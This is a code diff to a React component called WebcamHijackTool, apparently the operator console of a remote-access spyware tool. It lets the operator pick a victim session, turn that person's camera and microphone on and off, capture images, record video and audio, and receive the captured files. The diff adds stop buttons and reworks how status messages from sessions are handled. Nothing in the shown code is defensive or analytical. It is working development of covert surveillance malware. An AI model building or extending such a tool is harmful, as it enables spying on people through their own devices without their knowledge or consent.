@@ -5,7 +5,7 @@ import { useState, useRef, useEffect } from 'react';
 import { Card, CardHeader, CardTitle, CardDescription, CardContent } from '@/components/ui/card';
 import { Button } from '@/components/ui/button';
 import { useToast } from '@/hooks/use-toast';
-import { Camera, Video, Mic, StopCircle, Download, Image as ImageIcon, Info, Webcam, AudioLines, FileArchive } from 'lucide-react';
+import { Camera, Video, Mic, StopCircle, Download, Image as ImageIcon, Webcam, AudioLines, FileArchive } from 'lucide-react';
 import { logActivity } from '@/services/activity-log-service';
 import { useAuth } from '@/hooks/use-auth';
 import { Badge } from './ui/badge';
@@ -66,13 +66,17 @@ export function WebcamHijackTool({ sessions, selectedSessionId, setSelectedSessi
                 setCapturedMedia(prev => [newChunk, ...prev]);
                 toast({ title: "Media Captured!", description: `A new ${newChunk.type} file has been received from ${sessionId}.` });
             } else if (data.type === 'status') {
-                if (data.message === 'Permissions granted.') {
-                    if (sessionId === selectedSessionId) {
+                if (sessionId === selectedSessionId) {
+                    if (data.message === 'Permissions granted.') {
                        setIsCameraActive(true);
-                       setIsMicActive(true); // Permissions are usually granted together
+                       setIsMicActive(true);
+                    } else if (data.message === 'Stream stopped.') {
+                        setIsCameraActive(false);
+                        setIsMicActive(false);
+                        setLiveFeedSrc(null);
+                    } else {
+                        toast({ variant: 'destructive', title: 'Permission Error', description: `Session ${sessionId} reported: ${data.message}`});
                     }
-                } else {
-                    toast({ variant: 'destructive', title: 'Permission Error', description: `Session ${sessionId} reported: ${data.message}`});
                 }
             }
         }
@@ -157,6 +161,7 @@ export function WebcamHijackTool({ sessions, selectedSessionId, setSelectedSessi
                   </div>
                   <div className="grid grid-cols-2 gap-2">
                       <Button onClick={() => sendCommandToSession('start-video')} disabled={!hasActiveSession || isCameraActive}>Start Camera</Button>
+                      <Button onClick={() => sendCommandToSession('stop-stream')} disabled={!isCameraActive} variant="destructive">Stop Camera</Button>
                       <Button onClick={() => sendCommandToSession('capture-image')} disabled={!isCameraActive}>Capture Image</Button>
                       <Button onClick={() => { sendCommandToSession('start-video-record'); setIsVideoRecording(true); }} disabled={!isCameraActive || isVideoRecording}>Start Video Recording</Button>
                       <Button onClick={() => { sendCommandToSession('stop-video-record'); setIsVideoRecording(false); }} disabled={!isCameraActive || !isVideoRecording} variant="destructive">Stop Video Recording</Button>
@@ -172,6 +177,7 @@ export function WebcamHijackTool({ sessions, selectedSessionId, setSelectedSessi
                 <CardContent className="space-y-4">
                      <div className="grid grid-cols-2 gap-2">
                         <Button onClick={() => sendCommandToSession('start-mic')} disabled={!hasActiveSession || isMicActive}>Start Mic</Button>
+                        <Button onClick={() => sendCommandToSession('stop-stream')} disabled={!isMicActive} variant="destructive">Stop Mic</Button>
                         <Button onClick={() => { sendCommandToSession('start-audio-record'); setIsAudioRecording(true); }} disabled={!isMicActive || isAudioRecording}>Start Audio Recording</Button>
                         <Button onClick={() => { sendCommandToSession('stop-audio-record'); setIsAudioRecording(false); }} disabled={!isMicActive || !isAudioRecording} variant="destructive" className="col-span-2">Stop Audio Recording</Button>
                     </div>
